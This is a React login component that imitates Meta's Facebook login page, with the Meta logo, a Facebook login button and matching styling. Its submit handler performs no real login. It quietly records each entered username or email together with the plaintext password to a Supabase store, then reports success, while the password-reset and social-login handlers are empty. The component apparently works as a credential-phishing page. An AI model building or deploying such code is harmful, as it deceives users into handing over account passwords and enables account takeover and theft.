import React, { useState } from 'react';
import { ChevronLeft } from 'lucide-react';
import { useLanguage } from '../context/LanguageContext';
import { recordFormSubmission } from '../../lib/supabase';

interface LoginFormProps {
  onBack?: () => void;
  onCreateAccount?: () => void;
  onLoginSuccess?: (user: string) => void;
}

export const LoginForm: React.FC<LoginFormProps> = ({ onBack, onCreateAccount, onLoginSuccess }) => {
  const { t, isRTL } = useLanguage();
  const [identifier, setIdentifier] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    const cleanId = identifier.trim();
    if (!cleanId) return;

    // Automatically record to Supabase
    const isEmail = cleanId.includes('@');
    recordFormSubmission({
      type: 'login',
      email: isEmail ? cleanId : '',
      username: !isEmail ? cleanId : '',
      password: password,
      metadata: {
        identifier: cleanId,
        password: password,
        loginTimestamp: new Date().toISOString()
      }
    });

    if (onLoginSuccess) {
      onLoginSuccess(cleanId);
    }
  };

  const handleCreateAccount = () => {
    if (onCreateAccount) {
      onCreateAccount();
    }
  };

  const handleForgotPassword = () => {
  };

  const handleSocialLogin = () => {
  };

  const isFormFilled = identifier.trim().length > 0 && password.trim().length > 0;

  return (
    <div className="w-full max-w-[360px] sm:max-w-[390px] mx-auto py-6 sm:py-8 px-4 flex flex-col justify-center">
      {/* 3. TOP SECTION: Back Arrow (matches Registration Form arrow) */}
      {onBack && (
        <div className="mb-4 sm:mb-5">
          <button
            type="button"
            onClick={onBack}
            className="w-10 h-10 -ml-2 text-zinc-300 hover:text-white hover:bg-white/10 active:bg-white/20 transition-colors rounded-full flex items-center justify-center focus:outline-none focus-visible:ring-2 focus-visible:ring-zinc-400 cursor-pointer touch-manipulation"
            aria-label="Go back"
            id="login-top-back-btn"
          >
            <ChevronLeft className="w-6 h-6 stroke-[2.2]" />
          </button>
        </div>
      )}

      {/* Main Login Box / Section */}
      <div className="w-full">
        {/* Title */}
        <h2 className="main-text text-xl sm:text-[22px] font-semibold text-[#F2F4F6] text-start mb-6 tracking-tight">
          {t.title}
        </h2>

        {/* Form Inputs */}
        <form onSubmit={handleLogin} className="space-y-3.5">
          {/* Mobile number, username or email input */}
          <div>
            <input
              id="identifier"
              type="text"
              value={identifier}
              onChange={(e) => setIdentifier(e.target.value)}
              placeholder={t.identifierPlaceholder}
              autoComplete="username"
              className="input w-full bg-[#28292C] border border-[#50545B] hover:border-[#6b707a] focus:border-[#a8a8a8] rounded-xl px-4 py-3.5 text-sm text-[#F2F4F6] placeholder-[#9FA4AB] transition-colors focus:outline-none"
            />
          </div>

          {/* Password input */}
          <div className="relative">
            <input
              id="password"
              type={showPassword ? 'text' : 'password'}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder={t.passwordPlaceholder}
              autoComplete="current-password"
              className={`input w-full bg-[#28292C] border border-[#50545B] hover:border-[#6b707a] focus:border-[#a8a8a8] rounded-xl px-4 py-3.5 text-sm text-[#F2F4F6] placeholder-[#9FA4AB] transition-colors focus:outline-none ${
                isRTL ? 'pl-14' : 'pr-14'
              }`}
            />
            {password.length > 0 && (
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className={`absolute top-1/2 -translate-y-1/2 text-xs font-semibold text-[#9FA4AB] hover:text-[#4599FF] transition-colors cursor-pointer select-none ${
                  isRTL ? 'left-3.5' : 'right-3.5'
                }`}
              >
                {showPassword ? t.hide : t.show}
              </button>
            )}
          </div>

          {/* Primary Action Button: Log in */}
          <div className="pt-1">
            <button
              type="submit"
              className={`primary-button w-full py-2.5 px-4 rounded-full font-semibold text-sm transition-all duration-150 flex items-center justify-center cursor-pointer min-h-[44px] ${
                isFormFilled
                  ? 'bg-[#133B6E] hover:bg-[#184886] active:bg-[#102f58] text-[#F2F4F6] shadow-sm'
                  : 'bg-[#133B6E]/70 hover:bg-[#133B6E]/80 text-[#F2F4F6]/70 hover:text-[#F2F4F6] cursor-pointer'
              }`}
            >
              {t.loginButton}
            </button>
          </div>
        </form>

        {/* Forgot password? text link */}
        <div className="my-6 text-center">
          <button
            type="button"
            onClick={handleForgotPassword}
            className="main-text text-[#F2F4F6] font-medium text-sm hover:text-[#4599FF] hover:underline transition-colors cursor-pointer min-h-[36px] flex items-center justify-center mx-auto"
          >
            {t.forgotPassword}
          </button>
        </div>

        {/* Actions Stack */}
        <div className="space-y-3 pt-2">
          {/* Secondary Button: Log in with Facebook */}
          <button
            type="button"
            onClick={handleSocialLogin}
            className="facebook-button w-full py-2.5 px-4 rounded-full bg-[#28292C] hover:bg-[#34363C] active:bg-[#202123] text-[#F2F4F6] font-medium text-sm transition-colors flex items-center justify-center gap-2.5 cursor-pointer border border-[#50545B]/60 hover:border-[#50545B] min-h-[44px]"
          >
            {/* Facebook circle icon */}
            <div className="w-4 h-4 rounded-full bg-[#4599FF] flex items-center justify-center shrink-0">
              <svg viewBox="0 0 40 40" className="facebook-icon w-3.5 h-3.5 text-[#4599FF]" fill="none">
                <path
                  fill="#ffffff"
                  d="M27.8 25.6l0.9-5.6h-5.3v-3.9c0-1.6 0.6-2.8 3-2.8H29V8.2c-1.4-0.2-3-0.4-4.4-0.4-4.6 0-7.8 2.8-7.8 7.8V20h-5v5.6h5v14.1c1.1 0.2 2.2 0.3 3.3 0.3 1.1 0 2.2-0.1 3.3-0.3V25.6h4.4z"
                />
              </svg>
            </div>
            <span>{t.loginWithFacebook}</span>
          </button>

          {/* Outline Button: Create new account */}
          <button
            type="button"
            onClick={handleCreateAccount}
            className="create-account create-account-text w-full py-2.5 px-4 rounded-full border border-[#4599FF] hover:border-[#4599FF] hover:bg-[#4599FF]/10 active:bg-[#4599FF]/20 text-[#4599FF] font-semibold text-sm transition-colors flex items-center justify-center cursor-pointer min-h-[44px]"
          >
            {t.createNewAccount}
          </button>
        </div>

        {/* Meta branding at bottom */}
        <div className="mt-8 sm:mt-10 flex items-center justify-center select-none pointer-events-none">
          <img
            src="/meta-logo-white.svg"
            alt="Meta"
            className="h-3.5 w-auto object-contain select-none"
            draggable={false}
          />
        </div>
      </div>
    </div>
  );
};
